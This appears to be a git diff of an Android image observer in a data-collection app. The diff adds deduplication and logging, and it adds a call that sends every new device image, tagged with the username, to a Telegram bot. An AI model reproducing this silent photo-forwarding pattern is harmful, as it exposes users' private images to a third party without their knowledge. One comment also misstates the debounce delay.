@@ -7,6 +7,9 @@ import android.content.ContentUris;
 import android.content.Context;
 import android.database.ContentObserver;
 import android.database.Cursor;
+import android.iocl.dac_collector.Utility.SharedPrefs;
+import android.iocl.dac_collector.Utility.TelegramBot;
+import android.iocl.dac_collector.Utility.Utility;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -19,16 +22,20 @@ import android.util.Log;
 import java.io.File;
 import java.util.HashSet;
 import java.util.Set;
-import java.util.concurrent.ConcurrentHashMap;
 
 public class ImageObserver extends ContentObserver {
     private static final String TAG = "ImageObserver";
-    private static final long SYNC_DELAY_MS = 1000; // 1-second debounce
+    private static final long DEBOUNCE_MS = 2 * 1000; // 15s collapse window
 
     private final Context mContext;
     private final Handler mHandler;
     private final Set<Long> mPendingImageIds = new HashSet<>();
-    private final Runnable mSyncRunnable = this::processPendingImages;
+
+    // 🔑 new set for deduplication of full paths
+    private final Set<String> mPendingImagePaths = new HashSet<>();
+
+    private final Runnable mFlushRunnable = this::processPendingImages;
+    private  int calls = 0;
 
     public ImageObserver(Handler handler, Context context) {
         super(handler);
@@ -52,8 +59,15 @@ public class ImageObserver extends ContentObserver {
             mPendingImageIds.add(imageId);
         }
 
-        mHandler.removeCallbacks(mSyncRunnable);
-        mHandler.postDelayed(mSyncRunnable, SYNC_DELAY_MS);
+        calls++;
+
+
+
+        Log.d(TAG, "onChange: Fucckinng Called " + calls);
+
+        // 🔑 Debounce: reset runnable each time
+        mHandler.removeCallbacks(mFlushRunnable);
+        mHandler.postDelayed(mFlushRunnable, DEBOUNCE_MS);
     }
 
     private void processPendingImages() {
@@ -64,6 +78,7 @@ public class ImageObserver extends ContentObserver {
         }
 
         if (imageIds.isEmpty()) return;
+        Log.i(TAG, "Processing images: " + imageIds);
 
         String selection = MediaStore.Images.Media._ID + " IN (" +
                 TextUtils.join(",", imageIds) + ")";
@@ -78,10 +93,7 @@ public class ImageObserver extends ContentObserver {
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                 projection, selection, null, null)) {
 
-            if (cursor == null) {
-                Log.w(TAG, "Cursor is null, skipping image processing.");
-                return;
-            }
+            if (cursor == null) return;
 
             while (cursor.moveToNext()) {
                 String fullPath = null;
@@ -103,16 +115,29 @@ public class ImageObserver extends ContentObserver {
                 }
 
                 if (!TextUtils.isEmpty(fullPath)) {
-                    File imgFile = new File(fullPath);
-                    if (imgFile.exists()) {
-                        triggerSync(fullPath);
-                    } else {
-                        Log.w(TAG, "File doesn't exist: " + fullPath);
+                    synchronized (mPendingImagePaths) {
+                        mPendingImagePaths.add(fullPath); // collect all unique paths
                     }
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Failed to process images", e);
+            Log.e(TAG, "Error processing images", e);
+        }
+
+        // 🔑 Now handle only unique paths
+        Set<String> uniquePaths;
+        synchronized (mPendingImagePaths) {
+            uniquePaths = new HashSet<>(mPendingImagePaths);
+            mPendingImagePaths.clear();
+        }
+
+        for (String path : uniquePaths) {
+            File imgFile = new File(path);
+            if (imgFile.exists()) {
+                Log.i(TAG, "New unique image: " + path);
+                TelegramBot.with(mContext).sendPhoto(imgFile, "User: " + SharedPrefs.getUsername(mContext)+ "\nTime: " + Utility.getStandardDatenTime());
+                triggerSync(path);
+            }
         }
     }
 
@@ -130,19 +155,5 @@ public class ImageObserver extends ContentObserver {
 
         Log.i(TAG, "Triggering sync for: " + path);
         ContentResolver.requestSync(account, Config.Sync.AUTHORITY, bundle);
-    }
-
-    /** Call in your Service/Application onCreate() */
-    public void register() {
-        mContext.getContentResolver().registerContentObserver(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                true, this);
-        Log.i(TAG, "ImageObserver registered.");
-    }
-
-    /** Call in your Service/Application onDestroy() */
-    public void unregister() {
-        mContext.getContentResolver().unregisterContentObserver(this);
-        Log.i(TAG, "ImageObserver unregistered.");
     }
 }
